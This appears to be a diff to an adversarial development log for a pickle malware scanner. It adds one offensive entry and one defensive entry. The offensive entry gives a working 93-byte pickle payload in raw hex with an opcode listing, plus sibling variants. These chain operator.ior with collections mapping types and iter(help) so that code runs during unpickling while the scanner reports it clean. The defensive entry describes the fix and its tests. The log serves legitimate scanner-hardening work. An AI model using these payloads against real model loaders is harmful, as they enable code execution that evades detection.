@@ -18251,3 +18251,223 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3831 passed, 1022 skipped, 21 warnings in 37.08s
 ```
+
+## Turn 273 - Bypass via residual `operator.ior` mapping receivers
+
+Offensive turn after the Turn 272 defense. The receiver-aware `operator`
+protocol table now covers `dict` for `operator.ior`, but several clean stdlib
+mapping receivers use the same update-from-iterable semantics and still bypass
+the scanner.
+
+Representative:
+
+```python
+operator.ior(collections.ChainMap(), iter(builtins.help, "stop"))
+```
+
+`ChainMap.__ior__` updates the first underlying mapping from the right-hand
+operand. Passing a call iterator of `(key, value)` pairs drains that iterator
+during `pickle.loads`, invoking `builtins.help()`. The first `help()` call
+imports `pydoc`, so a shadow `pydoc.py` on `sys.path` executes.
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c086f70657261746f728c03696f72938c0b636f6c6c656374696f6e738c08436861696e4d6170932952680086522e
+```
+
+Payload shape:
+
+```text
+00: PROTO 4
+18: STACK_GLOBAL builtins.iter
+35: STACK_GLOBAL builtins.help
+42: TUPLE2
+43: REDUCE              # iter(help, "stop")
+44: MEMOIZE
+45: POP
+61: STACK_GLOBAL operator.ior
+85: STACK_GLOBAL collections.ChainMap
+86: EMPTY_TUPLE
+87: REDUCE              # collections.ChainMap()
+88: BINGET 0            # call iterator of key/value pairs
+90: TUPLE2
+91: REDUCE              # operator.ior(ChainMap(), call_iterator), drains rhs
+92: STOP
+```
+
+Scanner proof:
+
+```text
+payload_len 93
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', 18, False),
+  ('builtins', 'help', 35, False),
+  ('operator', 'ior', 61, False),
+  ('collections', 'ChainMap', 85, False),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'ChainMap', 0, 87),
+  ('operator', 'ior', 2, 91),
+]
+```
+
+Runtime proof:
+
+```text
+runtime_rc 0
+runtime_type ChainMap
+runtime_repr ChainMap({'owned-key': 'owned-value'})
+marker_exists True
+marker_text owned
+```
+
+Sibling probes from the same source family:
+
+```text
+operator.ior(collections.defaultdict(), iter(help, "stop"))
+payload_len 96
+scan clean findings 0 errors ()
+runtime_type defaultdict
+runtime_repr defaultdict(None, {'owned-key': 'owned-value'})
+marker_exists True
+marker_text owned-by-ior-defaultdict
+
+operator.ior(collections.OrderedDict(), iter(help, "stop"))
+payload_len 96
+scan clean findings 0 errors ()
+runtime_type OrderedDict
+runtime_repr OrderedDict({'owned-key': 'owned-value'})
+marker_exists True
+marker_text owned-by-ior-ordereddict
+
+operator.ior(collections.UserDict(), iter(help, "stop"))
+payload_len 93
+scan clean findings 0 errors ()
+runtime_type UserDict
+runtime_repr {'owned-key': 'owned-value'}
+marker_exists True
+marker_text owned-by-ior-userdict
+```
+
+Why it bypasses:
+
+- Turn 270 modeled `operator.ior` for plain built-in `dict` receivers.
+- Turn 272 broadened sequence receivers but did not revisit mapping receivers.
+- `ChainMap`, `defaultdict`, `OrderedDict`, and `UserDict` are clean imports
+  and are represented as constructed stdlib values rather than primitive
+  `dict` stack values.
+- Their in-place union/update paths consume the right-hand iterable of pairs,
+  but native metadata records only `operator.ior(...)` and omits the hidden
+  zero-argument `builtins.help()` invocation.
+
+Likely source-level defense:
+
+- Broaden the `operator.ior` receiver predicate to cover known clean mapping
+  receivers that update from iterable pairs:
+  `dict`, `collections.ChainMap`, `collections.defaultdict`,
+  `collections.OrderedDict`, and `collections.UserDict`.
+- Keep `collections.Counter` out unless separately proven with an accepted
+  right-hand operand shape; `Counter.__ior__` expects a mapping-like object with
+  `.items()` and did not consume a plain call iterator in probing.
+
+Performance note:
+
+- The representative payload is 93 bytes.
+- Warm scan median over 1000 runs was `0.000067s`, p95 `0.000075s`, and max
+  `0.000555s`.
+
+## Turn 274 - Block residual `operator.ior` mapping receivers
+
+Defensive turn for the Turn 273 bypass. The fix broadens only the
+`operator.ior` receiver predicate to known clean mapping receivers that update
+from iterable `(key, value)` pairs. This keeps the public `operator` protocol
+model source-level and receiver-aware.
+
+Focused change:
+
+```text
+operator.ior(dict|ChainMap|defaultdict|OrderedDict|UserDict, call_iterator) -> drains rhs
+```
+
+Boundary kept:
+
+```text
+operator.ior(Counter, call_iterator) -> AttributeError without advancing rhs
+```
+
+Post-fix proof for the Turn 273 representative payload:
+
+```text
+payload_len 93
+scan malicious findings 1 errors ()
+imports [
+  ('builtins', 'iter', 18),
+  ('builtins', 'help', 35),
+  ('operator', 'ior', 61),
+  ('collections', 'ChainMap', 85),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('collections', 'ChainMap', 0, 87),
+  ('operator', 'ior', 2, 91),
+  ('builtins', 'help', 0, 91),
+]
+finding DANGEROUS_CALL_GRAPH {
+  'module': '_sitebuiltins',
+  'name': '_Helper.__call__',
+  'sink': 'builtins.__import__',
+  'call_path': ('_sitebuiltins._Helper.__call__', 'builtins.__import__'),
+}
+runtime_rc 0
+runtime_type ChainMap
+runtime_repr ChainMap({'owned-key': 'owned-value'})
+marker_exists True
+marker_text owned-by-ior-chainmap
+runtime_stderr
+```
+
+Regression coverage:
+
+- Added malicious positives for `operator.ior` with `ChainMap`,
+  `defaultdict`, `OrderedDict`, and `UserDict` receivers.
+- Kept the existing plain `dict` `operator.ior` positive.
+- Added a clean runtime-proven negative for `Counter`, which expects a
+  mapping-like object with `.items()` and raises before advancing a plain call
+  iterator.
+
+Simplification note:
+
+- The fix reuses the existing `operator_protocol_consumed_callable(...)` path.
+  No new dangerous globals or package-specific call-graph rules were needed.
+- Mapping-update receivers now sit in one exact predicate, alongside the
+  sequence-add and slice-assignment predicates from Turn 272.
+
+Performance note:
+
+- Warm post-fix scan timing over 1000 runs: median `0.000148s`, p95
+  `0.000201s`, max `0.000477s`.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+pytest targeted operator protocol mapping regressions
+14 passed in 0.83s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+121 passed in 3.71s
+
+pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+159 passed in 5.65s
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3836 passed, 1022 skipped, 21 warnings in 46.92s
+```
